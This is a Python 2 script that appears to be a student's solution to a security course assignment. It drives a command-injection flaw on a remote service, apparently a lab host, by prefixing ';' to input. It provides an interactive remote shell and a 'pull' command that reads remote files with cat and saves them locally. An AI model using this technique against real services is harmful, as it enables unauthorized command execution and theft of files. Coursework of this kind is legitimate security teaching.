"""
    Use the same techniques such as (but not limited to):
        1) Sockets
        2) File I/O
        3) raw_input()

    from the OSINT HW to complete this assignment. Good luck!
"""

import socket
import time

host = "cornerstoneairlines.co" # IP address here
port = 45 # Port here

def execute_cmd(cmd):
    """
        Sockets: https://docs.python.org/2/library/socket.html
        How to use the socket s:

            # Establish socket connection
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))

            Reading:

                data = s.recv(1024)     # Receives 1024 bytes from IP/Port
                print(data)             # Prints data

            Sending:

                s.send("something to send\n")   # Send a newline \n at the end of your command
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,port))
    time.sleep(2)
    data1 = s.recv(1024)
    time.sleep(2)

    #If it's a pull command, we need to cat the file, save it to a variable,
    #then write the variable to another file
    if cmd.startswith("pull"):
        x = cmd.split()
        f1 = x[1]
        s.send(";" + "cat " + f1 + "\n")
        time.sleep(4)
        data = s.recv(1024)
        f2 = open(x[2], 'w')
        f2.write(data)
        print("Saved " + x[1] + " to " + x[2])
        f2.close()

    #If it's not a pull request, we can just input the command
    #and print the output.
    else :
        #concatenates a ";" so the next command will be executed by the server
        s.send(";" + cmd + "\n")
        time.sleep(4)
        data = s.recv(1024)
        print(data)


if __name__ == '__main__':
    adds = ''
    #Infinite loop
    while 1:
        y = raw_input(">> ")
        if y == "quit":
            break

        if y.startswith("pull"):
            execute_cmd(y)

        elif y != 'shell':
            p = open('Help_menu.txt', 'r')
            print(p.read())
            p.close()

        #Drops into shell mode
        else:
            while 1:
                x = raw_input("/> ")
                if x == 'exit':
                    break
                
                if x.startswith("cd"):
                    adds = adds + x + "; "

                execute_cmd((adds + x))
